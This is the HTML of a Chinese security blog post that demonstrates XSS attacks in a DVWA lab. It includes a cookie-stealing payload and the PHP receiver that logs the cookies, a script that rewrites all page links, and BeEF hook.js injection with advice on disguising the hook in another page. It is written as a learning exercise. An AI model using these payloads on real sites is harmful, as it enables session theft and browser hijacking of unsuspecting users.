@@ -1,0 +1,215 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>XSS利用1 | flymell</title><meta name="keywords" content="CTF,XSS"><meta name="author" content="flymell"><meta name="copyright" content="flymell"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言最近接触XSS，才开始觉得 XSS的作用也就是获取Cookies，伪造用户登录而已，而且利用姿势比较苛刻，但是随着深入的学习，才发现并不是那么简单，下面开始复现几个XSS利用的场景。 场景获取用户cookie我们可以利用反射型XSS，通过向目标用户发送恶意的url，来获取对方的cookies，从而伪造用户登录 演示环境： win7 虚拟机，开启web服务 (ip 为 192.168.0.104">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS利用1">
+<meta property="og:url" content="https://flymell.github.io/2022/03/13/XSS%E5%88%A9%E7%94%A81/index.html">
+<meta property="og:site_name" content="flymell">
+<meta property="og:description" content="前言最近接触XSS，才开始觉得 XSS的作用也就是获取Cookies，伪造用户登录而已，而且利用姿势比较苛刻，但是随着深入的学习，才发现并不是那么简单，下面开始复现几个XSS利用的场景。 场景获取用户cookie我们可以利用反射型XSS，通过向目标用户发送恶意的url，来获取对方的cookies，从而伪造用户登录 演示环境： win7 虚拟机，开启web服务 (ip 为 192.168.0.104">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://flymell.github.io/my_pic/top_img.png">
+<meta property="article:published_time" content="2022-03-13T14:44:24.000Z">
+<meta property="article:modified_time" content="2022-03-13T14:48:21.530Z">
+<meta property="article:author" content="flymell">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://flymell.github.io/my_pic/top_img.png"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://flymell.github.io/2022/03/13/XSS%E5%88%A9%E7%94%A81/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XSS利用1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-13 22:48:21'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/my_pic/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/my_pic/top_img.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">flymell</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XSS利用1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-13T14:44:24.000Z" title="发表于 2022-03-13 22:44:24">2022-03-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-13T14:48:21.530Z" title="更新于 2022-03-13 22:48:21">2022-03-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XSS利用1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近接触XSS，<del>才开始觉得 XSS的作用也就是获取Cookies，伪造用户登录而已，而且利用姿势比较苛刻</del>，但是随着深入的学习，才发现并不是那么简单，下面开始复现几个XSS利用的场景。</p>
+<h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><h2 id="获取用户cookie"><a href="#获取用户cookie" class="headerlink" title="获取用户cookie"></a>获取用户cookie</h2><p>我们可以利用反射型XSS，通过向目标用户发送恶意的url，来获取对方的cookies，从而伪造用户登录</p>
+<p>演示环境：</p>
+<p>win7 虚拟机，开启web服务 (ip 为 192.168.0.104)</p>
+<p>kali虚拟机，充当被害机</p>
+<p>我们首先在 win7上搭起 DVWA平台（充当存在 XSS漏洞的平台 ），并在 web根目录创建 cookie.php 文件，便于接受 受害机传来的cookie</p>
+<p>cookie.php的内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="string">&#x27;cookie.txt&#x27;</span>,<span class="variable">$cookie</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>当受害机登录到DVWA平台，找到反射型XSS选项后，在输入框里输入我们的payload:</p>
+<p><code>&lt;script&gt;document.location=&#39;http://192.168.0.104/cookie.php?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>
+<img src="/images/XSS%E5%88%A9%E7%94%A81/image-20220313164843446.png" alt="image-20220313164843446" style="zoom:50%;" />
+
+<p>点击 submit 后，会发现:</p>
+<img src="/images/XSS%E5%88%A9%E7%94%A81/image-20220313164934258.png" alt="image-20220313164934258" style="zoom:50%;" />
+
+<p>网页会跳转到 win7 的cookie.php。</p>
+<p>此时我们打开 win的 web 根目录会发现创建了cookie.txt，并在cookie.txt发现了受害机的cookie</p>
+<img src="/images/XSS%E5%88%A9%E7%94%A81/image-20220313165257520.png" alt="image-20220313165257520" style="zoom:50%;" />
+
+<p>至于获取到cookie以后，本想利用cookie，伪造被害者登录，但是一直尝试失败。还是自己太菜了</p>
+<h2 id="篡改网页连接"><a href="#篡改网页连接" class="headerlink" title="篡改网页连接"></a>篡改网页连接</h2><p>相关代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">var</span> link=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;link.length;j++)&#123;</span><br><span class="line">    link[j].href=<span class="string">&quot;https://flymell.space/&quot;</span>;&#125;</span><br><span class="line">    &#125;    </span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//window.onload  当窗口加载时，执行匿名函数。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用for循环遍历所有获得的链接a标签。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>同样，进入 DVWA平台，*<em>一定要把安全设置调到 low</em></p>
+<p>选择反射型XSS平台（存储型的也可以），没输入之前，我们查看一下相关的链接为：</p>
+<p><img src="/images/XSS%E5%88%A9%E7%94%A81/image-20220313210721786.png" alt="image-20220313210721786"></p>
+<p>输入恶意代码后：</p>
+<p><img src="/images/XSS%E5%88%A9%E7%94%A81/image-20220313210829183.png" alt="image-20220313210829183"></p>
+<p>点击后，成功跳转</p>
+<p><img src="/images/XSS%E5%88%A9%E7%94%A81/image-20220313210905480.png" alt="image-20220313210905480"></p>
+<h2 id="指向恶意链接"><a href="#指向恶意链接" class="headerlink" title="指向恶意链接"></a>指向恶意链接</h2><p>所需要的工具：kali作为攻击机（ip 192.168.0.105） , win7作为受害机</p>
+<p>我们首先在kali里安装beef-xss（新版kaili没有安装这个工具，所以需要自己安装）</p>
+<p>打开终端，输入：</p>
+<p><code>apt install beef-xss</code></p>
+<p>安装时可能出现报错，这时候不要慌，根据终端的提示输入它建议的指令，就好了</p>
+<p><img src="/images/XSS%E5%88%A9%E7%94%A81/image-20220313220753308.png" alt="image-20220313220753308"></p>
+<p><img src="/images/XSS%E5%88%A9%E7%94%A81/image-20220313220820111.png" alt="image-20220313220820111"></p>
+<p>反复几次，就可以安装成功了</p>
+<p>安装成功后，在终端输入：</p>
+<p><code>beef-xss</code></p>
+<p><img src="/images/XSS%E5%88%A9%E7%94%A81/image-20220313221020569.png" alt="image-20220313221020569"></p>
+<p>程序就开始启动了，首次启动时，会让你输入新的密码，自己设定就可以，输入完成后，等待beef 运行，会自动弹出浏览器，出现beef的登录页面，输入账号密码后就可以进入，等待目标上钩</p>
+<p><img src="/images/XSS%E5%88%A9%E7%94%A81/image-20220313221310758.png" alt="image-20220313221310758"></p>
+<p>然后我们要注意终端的提示</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Web UI: http://127.0.0.1:3000/ui/panel</span><br><span class="line">[*]    Hook: &lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">[*] Example: &lt;script src=&quot;http://127.0.0.1:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们需要在win7中DVWA中的xss训练漏洞中输入Hook(钩子)：</p>
+<p><code>&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</code></p>
+<p>我们kali的 ip为192.168.0.105</p>
+<p>所以我们的payload为：</p>
+<p><code>&lt;script src=&quot;http://192.168.0.105:3000/hook.js&quot;&gt;&lt;/script&gt;</code></p>
+<p><img src="/images/XSS%E5%88%A9%E7%94%A81/image-20220313222441468.png" alt="image-20220313222441468"></p>
+<p>输入后，然后点击submit，然后查看 kali的浏览器，</p>
+<p><img src="/images/XSS%E5%88%A9%E7%94%A81/image-20220313223352590.png" alt="image-20220313223352590"></p>
+<p>成功！</p>
+<p>此外，我们还可以将我们的payload插入一个页面里（比如index.php），让win7访问该页面，也能使 hook运行，这样起到伪装的作用</p>
+<p>Payload:</p>
+<p><code>&lt;script src=&quot;http://192.168.0.105/index.php:3000/hook.js&quot;&gt;&lt;/script&gt;</code></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">flymell</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://flymell.github.io/2022/03/13/XSS%E5%88%A9%E7%94%A81/">https://flymell.github.io/2022/03/13/XSS%E5%88%A9%E7%94%A81/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://flymell.github.io" target="_blank">flymell</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/XSS/">XSS</a></div><div class="post_share"><div class="social-share" data-image="/my_pic/top_img.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/03/09/%E3%80%90MRCTF2020%E3%80%91Ez-bypass/"><img class="next-cover" src="/my_pic/top_img.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【MRCTF2020】Ez_bypass</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/my_pic/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">flymell</div><div class="author-info__description">迈小步、不停步，天天进步</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF"><span class="toc-number">2.</span> <span class="toc-text">场景</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7cookie"><span class="toc-number">2.1.</span> <span class="toc-text">获取用户cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AF%A1%E6%94%B9%E7%BD%91%E9%A1%B5%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.2.</span> <span class="toc-text">篡改网页连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E5%90%91%E6%81%B6%E6%84%8F%E9%93%BE%E6%8E%A5"><span class="toc-number">2.3.</span> <span class="toc-text">指向恶意链接</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/03/13/XSS%E5%88%A9%E7%94%A81/" title="XSS利用1"><img src="/my_pic/top_img.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XSS利用1"/></a><div class="content"><a class="title" href="/2022/03/13/XSS%E5%88%A9%E7%94%A81/" title="XSS利用1">XSS利用1</a><time datetime="2022-03-13T14:44:24.000Z" title="发表于 2022-03-13 22:44:24">2022-03-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/09/%E3%80%90MRCTF2020%E3%80%91Ez-bypass/" title="【MRCTF2020】Ez_bypass"><img src="/my_pic/top_img.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【MRCTF2020】Ez_bypass"/></a><div class="content"><a class="title" href="/2022/03/09/%E3%80%90MRCTF2020%E3%80%91Ez-bypass/" title="【MRCTF2020】Ez_bypass">【MRCTF2020】Ez_bypass</a><time datetime="2022-03-09T14:19:37.000Z" title="发表于 2022-03-09 22:19:37">2022-03-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/09/%E4%B8%8D%E6%AD%BB%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E5%88%A0%E9%99%A4/" title="不死马的利用和删除"><img src="/my_pic/top_img.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="不死马的利用和删除"/></a><div class="content"><a class="title" href="/2022/03/09/%E4%B8%8D%E6%AD%BB%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E5%88%A0%E9%99%A4/" title="不死马的利用和删除">不死马的利用和删除</a><time datetime="2022-03-09T13:11:38.000Z" title="发表于 2022-03-09 21:11:38">2022-03-09</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/my_pic/top_img.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By flymell</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
